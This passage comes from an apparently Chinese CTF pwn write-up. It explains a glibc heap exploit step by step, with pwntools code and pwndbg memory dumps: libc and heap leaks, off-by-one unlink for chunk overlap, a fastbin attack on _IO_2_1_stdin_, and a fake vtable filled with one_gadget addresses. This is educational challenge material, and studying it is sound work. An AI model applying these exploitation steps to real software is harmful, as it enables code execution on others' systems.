class="comment"># index 3</span></span><br><span class="line"></span><br><span class="line">cmd_del(<span class="number">1</span>)	</span><br><span class="line">cmd_del(<span class="number">2</span>)</span><br><span class="line">cmd_add(<span class="number">0xc0</span>,flat(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x38</span>,<span class="number">0x71</span>,fake_target)) <span class="comment"># to index 2</span></span><br><span class="line">cmd_add(<span class="number">0xa8</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(one_gadget)*<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite vtable</span></span><br><span class="line">fake_vtable = heap_addr + <span class="number">0x210</span></span><br><span class="line">success(<span class="string">&#x27;fake_vtable &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(fake_vtable))</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>+flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xffffffff</span>,<span class="number">0</span>,<span class="number">0</span>,fake_vtable,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">cmd_add(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这时大佬泄露 libc_base 的过程（和我的想法一致，但堆风水比我好了不少）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">cmd_add(<span class="number">0x40</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">cmd_add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">offset = <span class="number">0x7ffff7bcdb78</span> - <span class="number">0x7ffff7bcdb0a</span></span><br><span class="line">cmd_del(<span class="number">2</span>) </span><br><span class="line">cmd_add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 申请回来相同的chunk,是为了可以打印出来</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(cmd_show(<span class="number">2</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) + offset</span><br><span class="line">offset = <span class="number">0x7f3d7a680b78</span> - <span class="number">0x7f3d7a2bc000</span></span><br><span class="line">libc.address = main_arena - offset</span><br><span class="line">success(<span class="string">&#x27;main_arena &gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>
<p>堆布局如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x56164214f000</span></span><br><span class="line">Size: <span class="number">0x1011</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x561642150010</span> <span class="comment">// chunk0</span></span><br><span class="line">Size: <span class="number">0x51</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x561642150060</span> <span class="comment">// chunk1</span></span><br><span class="line">Size: <span class="number">0x71</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5616421500d0</span> <span class="comment">// chunk2</span></span><br><span class="line">Size: <span class="number">0x101</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5616421501d0</span> <span class="comment">// chunk3</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5616421501f0</span></span><br><span class="line">Size: <span class="number">0x20e11</span></span><br></pre></td></tr></table></figure>
<p>释放 chunk2 后，chunk2进入 unsortedbin ，重新申请回来使其在保留 leak 数据的前提下可以被 show 出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5616421500d0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5616421500d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5616421500d8</span> ◂— <span class="number">0x101</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5616421500e0</span> —▸ <span class="number">0x7ff69bf5cb0a</span> (__realloc_hook+<span class="number">2</span>) ◂— <span class="number">0x7ff69bc1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5616421500e8</span> —▸ <span class="number">0x7ff69bf5cb78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x5616421501f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x5616421500f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br></pre></td></tr></table></figure>
<p>“0x7ff69bf5cb0a”被 leak 出来，直接计算 libc_base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak heap_addr</span></span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line">cmd_del(<span class="number">3</span>)</span><br><span class="line">cmd_del(<span class="number">4</span>)</span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># FIFO,先申请chunk4(作为chunk3)</span></span><br><span class="line"></span><br><span class="line">heap_addr = u64(cmd_show(<span class="number">3</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x10a</span> + <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure>
<p>堆布局如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5622703620d0</span> <span class="comment">// chunk2</span></span><br><span class="line">Size: <span class="number">0x101</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(fastbins)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x5622703621d0 <span class="comment">// chunk3</span></span></span><br><span class="line"><span class="function">Size: 0x21</span></span><br><span class="line"><span class="function">fd: 0x00</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x5622703621f0 <span class="comment">// chunk4(作为chunk3)</span></span></span><br><span class="line"><span class="function">Size: 0x21</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5622703621f0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5622703621f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5622703621f8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x562270362200</span> —▸ <span class="number">0x56227036210a</span> ◂— <span class="number">0x0</span> </span><br><span class="line">    <span class="comment">/* 残留的FD,原本该指向chunk3 head,但是末尾的&quot;\n&quot;覆盖了最后一字节 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x562270362208</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x562270362210</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x562270362218</span> ◂— <span class="number">0x20df1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x562270362220</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x562270362228</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>“0x56227036210a”会被 leak 出来，可以计算 heap_addr（heap首地址）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># unlink for overlapping</span></span><br><span class="line">cmd_del(<span class="number">0</span>) </span><br><span class="line">cmd_add(<span class="number">0x40</span>,flat(<span class="number">0</span>,<span class="number">0xb1</span>,heap_addr+<span class="number">0x18</span>,heap_addr+<span class="number">0x20</span>,heap_addr+<span class="number">0x10</span>)) <span class="comment"># chunk0</span></span><br><span class="line">cmd_del(<span class="number">1</span>)</span><br><span class="line">cmd_add(<span class="number">0x68</span>,flat(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span>,<span class="number">0xb0</span>)) <span class="comment"># chunk1(off-by-one覆盖chunk2-&gt;size)</span></span><br><span class="line">cmd_del(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>因为本程序的修改模块失效，所以大佬用了这种方式进行修改（fastbin的性质）</p>
<p>free第三块chunk前堆的情况： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5559a9d3f010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// chunk0(index0)</span></span><br><span class="line"><span class="number">0x5559a9d3f020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000b1</span></span><br><span class="line"><span class="number">0x5559a9d3f030</span>:	<span class="number">0x00005559a9d3f028</span>	<span class="number">0x00005559a9d3f030</span></span><br><span class="line"><span class="number">0x5559a9d3f040</span>:	<span class="number">0x00005559a9d3f020</span>	<span class="number">0x000000000000000a</span></span><br><span class="line"><span class="number">0x5559a9d3f050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> <span class="comment">// chunk1(index1)</span></span><br><span class="line"><span class="number">0x5559a9d3f070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0d0</span>:	<span class="number">0x00000000000000b0</span>	<span class="number">0x0000000000000100</span> <span class="comment">// chunk2(index2)</span></span><br><span class="line"><span class="number">0x5559a9d3f0e0</span>:	<span class="number">0x00007fd844656b0a</span>	<span class="number">0x00007fd844656b78</span></span><br><span class="line"><span class="number">0x5559a9d3f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>free第三块chunk后，堆成功重叠： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5559a9d3f010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// chunk0(index0)</span></span><br><span class="line"><span class="number">0x5559a9d3f020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000001b1</span> <span class="comment">// will be chunk2(index2)</span></span><br><span class="line"><span class="number">0x5559a9d3f030</span>:	<span class="number">0x00007fd844656b78</span>	<span class="number">0x00007fd844656b78</span></span><br><span class="line"><span class="number">0x5559a9d3f040</span>:	<span class="number">0x00005559a9d3f028</span>	<span class="number">0x000000000000000a</span></span><br><span class="line"><span class="number">0x5559a9d3f050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> <span class="comment">// chunk1(index1)</span></span><br><span class="line"><span class="number">0x5559a9d3f070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0d0</span>:	<span class="number">0x00000000000000b0</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x5559a9d3f0e0</span>:	<span class="number">0x00007fd844656b0a</span>	<span class="number">0x00007fd844656b78</span></span><br><span class="line"><span class="number">0x5559a9d3f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5559a9d3f020</span> —▸ <span class="number">0x7fd844656b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x5559a9d3f020</span></span><br><span class="line">    <span class="comment">/* chunk2和chunk1重叠,chunk1在free状态下被写入FD */</span></span><br></pre></td></tr></table></figure>
<p>unlink 成功了（其实我以前学习 wiki 上的案例时，遇到的都是要在 chunk_list 中打 unlink 的，今天遇到这个才发现 unlink 其实很灵活）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbins attack</span></span><br><span class="line">_IO_file_jumps = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">_IO_2_1_stdin_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">one_gadgets =[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget = libc.address + one_gadgets[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">fake_target = _IO_2_1_stdin_ + <span class="number">160</span> - <span class="number">0x3</span> <span class="comment"># 这个地方正好有&quot;0x7f&quot;</span></span><br><span class="line">cmd_add(<span class="number">0xc0</span>,<span class="string">&#x27;AAAAAAAA&#x27;</span>) <span class="comment"># index 2</span></span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">&#x27;BBBBBBBB&#x27;</span>) <span class="comment"># index 3</span></span><br><span class="line"></span><br><span class="line">cmd_del(<span class="number">1</span>)	</span><br><span class="line">cmd_del(<span class="number">2</span>) </span><br><span class="line">cmd_add(<span class="number">0xc0</span>,flat(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x38</span>,<span class="number">0x71</span>,fake_target)) <span class="comment"># to index 2</span></span><br><span class="line">cmd_add(<span class="number">0xa8</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(one_gadget)*<span class="number">19</span>)</span><br></pre></td></tr></table></figure>
<p>接下来的 chunk 申请，都应该在 fake chunk 中分割：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55efe9805010</span></span><br><span class="line"><span class="number">0x55efe9805010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x55efe9805020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000d1</span> <span class="comment">// fake chunk(index2)</span></span><br><span class="line"><span class="number">0x55efe9805030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55efe9805040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55efe9805050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55efe9805060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> <span class="comment">// chunk1(index1)</span></span><br><span class="line"><span class="number">0x55efe9805070</span>:	<span class="number">0x00007f39e554a97d</span>	<span class="number">0x000000000000000a</span> <span class="comment">// fake_target</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x00007f39e554a97d</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f39e554a97d</span> (_IO_2_1_stdin_+<span class="number">157</span>) ◂— <span class="number">0x39e554a9c0000000</span> <span class="comment">// presize</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f39e554a985</span> (_IO_2_1_stdin_+<span class="number">165</span>) ◂— <span class="number">0x7f</span> <span class="comment">// size</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f39e554a98d</span> (_IO_2_1_stdin_+<span class="number">173</span>) ◂— <span class="number">0x0</span> <span class="comment">// FD</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f39e554a995</span> (_IO_2_1_stdin_+<span class="number">181</span>) ◂— <span class="number">0x0</span> <span class="comment">// BK</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f39e554a99d</span> (_IO_2_1_stdin_+<span class="number">189</span>) ◂— <span class="number">0xffffffff000000</span> </span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f39e554a9a5</span> (_IO_2_1_stdin_+<span class="number">197</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f39e554a9ad</span> (_IO_2_1_stdin_+<span class="number">205</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f39e554a9b5</span> (_IO_2_1_stdin_+<span class="number">213</span>) ◂— <span class="number">0x39e55496e0000000</span> <span class="comment">// true_target</span></span><br></pre></td></tr></table></figure>
<p>新申请的 chunk 中被装满了 one_gadget ，方便后续劫持：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55efe9805210</span></span><br><span class="line"><span class="number">0x55efe9805210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000b1</span></span><br><span class="line"><span class="number">0x55efe9805220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55efe9805230</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span> <span class="comment">// one_gadget </span></span><br><span class="line"><span class="number">0x55efe9805240</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span></span><br><span class="line"><span class="number">0x55efe9805250</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span></span><br><span class="line"><span class="number">0x55efe9805260</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span></span><br><span class="line"><span class="number">0x55efe9805270</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span></span><br><span class="line"><span class="number">0x55efe9805280</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span></span><br><span class="line"><span class="number">0x55efe9805290</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span></span><br><span class="line"><span class="number">0x55efe98052a0</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># overwrite vtable</span></span><br><span class="line">fake_vtable = heap_addr + <span class="number">0x210</span> </span><br><span class="line">success(<span class="string">&#x27;fake_vtable &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(fake_vtable))</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>+flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xffffffff</span>,<span class="number">0</span>,<span class="number">0</span>,fake_vtable,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">cmd_add(<span class="number">0x60</span>,payload)</span><br></pre></td></tr></table></figure>
<p>先看看“fake_vtable”是什么：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] fake_vtable &gt;&gt; <span class="number">0x55d3aa3da220</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55d3aa3da210</span></span><br><span class="line"><span class="number">0x55d3aa3da210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000b1</span> <span class="comment">// chunk2</span></span><br><span class="line"><span class="number">0x55d3aa3da220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span> <span class="comment">// fake_vtable</span></span><br><span class="line"><span class="number">0x55d3aa3da230</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br><span class="line"><span class="number">0x55d3aa3da240</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br><span class="line"><span class="number">0x55d3aa3da250</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br><span class="line"><span class="number">0x55d3aa3da260</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br><span class="line"><span class="number">0x55d3aa3da270</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br><span class="line"><span class="number">0x55d3aa3da280</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br><span class="line"><span class="number">0x55d3aa3da290</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br><span class="line"><span class="number">0x55d3aa3da2a0</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br></pre></td></tr></table></figure>
<p>为了方便演示，先把“fake_vtable”换为无用地址（劫持之后GDB就无法正常显示了）</p>
<p>payload覆盖前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f754337997d</span>+<span class="number">3</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f7543379980</span> (_IO_2_1_stdin_+<span class="number">160</span>) —▸ <span class="number">0x7f75433799c0</span> (_IO_wide_data_0) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f7543379988</span> (_IO_2_1_stdin_+<span class="number">168</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f75433799a0</span> (_IO_2_1_stdin_+<span class="number">192</span>) ◂— <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f75433799a8</span> (_IO_2_1_stdin_+<span class="number">200</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f75433799b0</span> 